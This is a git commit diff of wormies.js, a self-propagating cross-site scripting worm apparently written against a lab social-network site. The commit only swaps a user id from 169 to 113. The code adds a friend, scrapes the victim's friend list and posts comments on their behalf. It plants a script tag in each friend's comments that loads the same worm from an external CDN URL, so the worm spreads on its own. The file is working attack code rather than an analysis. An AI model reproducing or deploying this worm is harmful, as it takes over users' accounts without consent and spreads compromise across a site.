7fb45af94d88134ca546ed56d89a011535a233e9
sxa7263 <35963445+sxa7263@users.noreply.github.com>
2020-11-08 12:02:18 -0500

    Update wormies.js

--- wormies.js
+++ wormies.js
@@ -1,12 +1,12 @@
 alert('WORMIES1');
-$.get("add_friend.php", {'id': 169}); 
+$.get("add_friend.php", {'id': 113}); 
 $.get("friends.php", (homies)=>{
     a = homies.split("?id="); 
     for(var i = 1; i < a.length; i++){
         b = a[i].split("'>")[0];
-        $.get("timeline.php", {'id': 169}, (report)=>{
+        $.get("timeline.php", {'id': 113}, (report)=>{
             if(!report.includes(b + " got wormed")){
-                $.get("add_comment.php", {'id': 169, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
+                $.get("add_comment.php", {'id': 113, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
                 $.get("add_comment.php", {'id': b, 'comment': "<script src='https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies.js'></script>YOU GOT WORMED"});
             }
         });
